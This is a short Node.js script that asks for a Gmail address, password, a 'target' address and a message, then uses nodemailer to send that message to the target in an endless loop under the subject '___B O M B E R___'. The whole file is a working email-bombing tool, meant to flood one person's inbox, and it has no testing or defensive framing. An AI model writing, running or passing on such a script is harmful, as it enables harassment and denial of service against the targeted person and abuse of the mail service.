const nodemailer = require("nodemailer");
const readline = require("readline");

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

function promptForInput(prompt) {
  return new Promise((resolve) => {
    rl.question(prompt, (input) => {
      resolve(input);
    });
  });
}

async function mail() {
  const email = await promptForInput("Enter your email: ");
  const password = await promptForInput("Enter your password: ");
  const target = await promptForInput("Enter the target email: ");
  const text = await promptForInput("Enter the email text: ");

  const transporter = nodemailer.createTransport({
    service: "Gmail",
    auth: {
      user: email,
      pass: password,
    },
  });
  while (true){

  const info = await transporter.sendMail({
    from: email,
    to: target,
    subject: "___B O M B E R___", // Replace with your subject
    text: text,
  });

  console.log("Email sent, Message ID: " + info.messageId);
}

  rl.close();

}

mail();
